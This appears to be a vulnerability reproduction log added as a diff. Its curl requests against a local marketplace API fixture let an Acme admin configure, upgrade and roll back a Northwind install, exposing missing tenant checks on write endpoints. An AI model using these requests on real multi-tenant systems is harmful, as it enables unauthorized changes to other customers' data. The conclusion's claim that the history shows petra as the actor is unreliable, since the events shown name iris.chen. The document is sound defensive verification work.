@@ -1,0 +1,125 @@
+# Family E reproduction (VWO-005 F6 / VWO-008 F4 / VWO-009 F8) — cross-tenant install writes incl. pin moves
+base: main @ 0f89393c60403e423a91cffc3055af07e31a0c0b; surface: FlowMart JSON API twins (curl) as petra.voss (org_admin, ACME RETAIL) attacking NORTHWIND's install ins-0402
+context: petra's own org has no install of pk-102 (GET /api/installs is org-scoped for her: see report VWO-008 F4 / VWO-009 F8); the write path resolves installs by id only.
+
+## probe 0 — org scoping of the read path (petra sees only Acme installs):
+$ curl -s http://127.0.0.1:4105/api/installs (Authorization: Bearer <petra-demo-token>)
+{
+    "ok": true,
+    "orgId": "o-2",
+    "installs": [
+        {
+            "id": "ins-0401",
+            "orgId": "o-2",
+            "packageId": "pk-102",
+
+## probe 1 — CROSS-TENANT CONFIGURE: petra (Acme) configures Northwind's ins-0402:
+$ curl -s -X POST http://127.0.0.1:4105/api/installs/configure -d '{"installId":"ins-0402","config":{"vwo010CrossTenant":"petra-overwrote-northwind"}}'
+{
+    "ok": true,
+    "message": "Install ins-0402 configured (vwo010CrossTenant).",
+    "redirect": "/installs",
+    "install": {
+        "id": "ins-0402",
+        "orgId": "o-1",
+        "packageId": "pk-103",
+        "version": "1.2.0",
+        "status": "active",
+        "config": {
+            "zones": "A",
+
+## probe 2 — CROSS-TENANT UPGRADE (PIN MOVE): petra (Acme, o-2) upgrades Northwind's ins-0402 (o-1) 1.2.0 → 1.3.0:
+$ curl -s -X POST http://127.0.0.1:4105/api/installs/upgrade -d '{"installId":"ins-0402","targetVersion":"1.3.0","expectedCurrentVersion":"1.2.0"}'
+{
+    "ok": true,
+    "message": "Install ins-0402 upgraded 1.2.0 \u2192 1.3.0.",
+    "warning": null,
+    "redirect": "/installs",
+    "install": {
+        "id": "ins-0402",
+        "orgId": "o-1",
+        "packageId": "pk-103",
+        "version": "1.3.0",
+
+## probe 3 — CROSS-TENANT ROLLBACK (PIN MOVE BACK): petra rolls Northwind's ins-0402 back:
+$ curl -s -X POST http://127.0.0.1:4105/api/installs/rollback -d '{"installId":"ins-0402"}'
+{
+    "ok": true,
+    "message": "Install ins-0402 rolled back 1.3.0 \u2192 1.2.0.",
+    "warning": null,
+    "redirect": "/installs",
+    "install": {
+        "id": "ins-0402",
+        "orgId": "o-1",
+        "packageId": "pk-103",
+        "version": "1.2.0",
+
+## post-hoc state — the write path recorded petra's id as the actor on Northwind's install (history tail):
+[]
+org-filter not honored on GET; showing via events instead
+[
+ {
+  "id": "ev-0018",
+  "ts": "2026-09-12T10:34:18.552Z",
+  "type": "install.configured",
+  "actor": "iris.chen",
+  "subject": "ins-0402",
+  "summary": "Install ins-0402 (Warehouse Slot Optimizer v1.2.0) reconfigured for Northwind Logistics",
+  "data": {
+   "installId": "ins-0402",
+   "packageId": "pk-103",
+   "keys": []
+  }
+ },
+ {
+  "id": "ev-0012",
+  "ts": "2026-09-12T10:33:39.701Z",
+  "type": "install.rolled_back",
+  "actor": "iris.chen",
+  "subject": "ins-0402",
+  "summary": "Northwind Logistics rolled back \"Warehouse Slot Optimizer\" 1.3.0 \u2192 1.2.0",
+  "data": {
+   "installId": "ins-0402",
+   "packageId": "pk-103",
+   "fromVersion": "1.3.0",
+   "toVersion": "1.2.0"
+  }
+ },
+ {
+  "id": "ev-0010",
+  "ts": "2026-09-12T10:33:39.693Z",
+  "type": "install.upgraded",
+  "actor": "iris.chen",
+  "subject": "ins-0402",
+  "summary": "Northwind Logistics upgraded \"Warehouse Slot Optimizer\" 1.2.0 \u2192 1.3.0",
+  "data": {
+   "installId": "ins-0402",
+   "packageId": "pk-103",
+   "fromVersion": "1.2.0",
+   "toVersion": "1.3.0",
+   "digest": "sha256:2e9c46167bcb150d"
+  }
+ },
+ {
+  "id": "ev-0006",
+  "ts": "2026-09-12T10:33:39.676Z",
+  "type": "package.installed",
+  "actor": "iris.chen",
+  "subject": "ins-0402",
+  "summary": "Northwind Logistics installed \"Warehouse Slot Optimizer\" v1.2.0 (ins-0402)",
+  "data": {
+   "installId": "ins-0402",
+   "orgId": "o-1",
+   "packageId": "pk-103",
+   "version": "1.2.0",
+   "digest": "sha256:04db53168e0cd3a0",
+   "entitlementId": "ent-0503"
+  }
+ }
+]
+
+## conclusion — REPRODUCED at main @ 0f89393c60403e423a91cffc3055af07e31a0c0b:
+  petra.voss (org_admin of Acme Retail, o-2) successfully CONFIGURED, UPGRADED (pin 1.2.0 → 1.3.0) and ROLLED BACK (1.3.0 → 1.2.0) Northwind Logistics' (o-1) install ins-0402 — every write returned ok:true and the history records petra's user id as the actor on a foreign-org install.
+  Read path is org-scoped (petra's GET /api/installs shows only ins-0401/o-2), confirming the reports: the guard exists on reads only.
+  Root cause (static): docs/validation/fixtures/marketplace/ops-install.js — configureInstall (line 100), upgradeInstall (line 117), rollbackInstall (line 156) all resolve the install via find(ctx.state.installs, b.installId) and NEVER compare orgForUser(ctx.state, ctx.user.id) with inst.orgId.
+  Matches VWO-005 F6 (first observation), VWO-008 F4, VWO-009 F8 (pin-move extension). RWO-003 owns the bounded fix.
